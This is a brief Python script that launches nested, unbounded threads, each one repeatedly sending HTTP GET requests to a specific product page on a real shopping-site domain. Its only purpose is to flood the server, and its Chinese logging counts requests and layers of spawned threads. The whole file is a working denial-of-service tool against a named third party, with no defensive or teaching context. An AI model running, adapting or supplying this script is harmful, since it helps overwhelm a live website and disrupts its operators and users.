import requests
import _thread
import time

def dd(t):
    try:
        requests.get("https://a.vipjinxuan.cn/vantmall/goodsProfile/859737342607361?type=27&pageSource=2&pId=875512192303104")
        print(">>>第%s次响应▼"%t)
    except:
        print("请求失败")
    finally:
        _thread.exit_thread()
t=0
print("waiting ...")

def wrapper():
    t=0
    while True:
        t+=1
        print("<<<第%s次请求▲"%t)
        time.sleep(0)
        _thread.start_new_thread(dd,(t,))
    
    
while True:
    t+=1
    print("<<<第%s次套娃"%t)
    time.sleep(0)
    _thread.start_new_thread(wrapper,())
    
